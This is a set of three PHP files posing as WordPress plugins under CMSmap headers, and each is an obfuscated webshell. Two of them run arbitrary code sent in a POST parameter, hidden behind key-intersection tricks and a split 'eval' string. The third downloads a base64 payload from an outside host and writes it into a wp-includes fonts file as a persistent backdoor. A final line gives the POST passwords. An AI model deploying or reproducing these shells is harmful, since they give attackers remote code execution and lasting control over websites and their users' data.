<?php
/**
 * Plugin Name: CMSmap - WordPress
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
$a1=array("a"=>"red","ss"=>"green","c"=>"blue","er"=>"hello","t"=>"hey");
$a2=array("a"=>"red","ss"=>"blue","d"=>"pink","er"=>"hellos","moza"=>"good_boy","t"=>"hey");
$result=array_intersect_key($a1,$a2);
$a = array_keys($result);
$man = $a[0].$a[1].$a[2]."t";
$kk=$_POST['a'];
@$man($kk=$kk);
print_r($a1);
?>
<?php
/**
 * Plugin Name: CMSmap - WordPress
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
  $a = 'http://rd.ruiyali.com/wp-includes/Text/Diff/textdiff.txt';$b = 'file'.'_g'.'et_'.'contents';$b = $b($a);$c = strrev('stnetnoc_tup_elif');$c($_SERVER['DOCUMENT_ROOT'].'//wp-includes//fonts//css.php', base64_decode($b));
?>
<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
function bypass(){
    return "l(\$_POST['";
}
eval("eva".bypass()."x']);");
?>

postpass x or a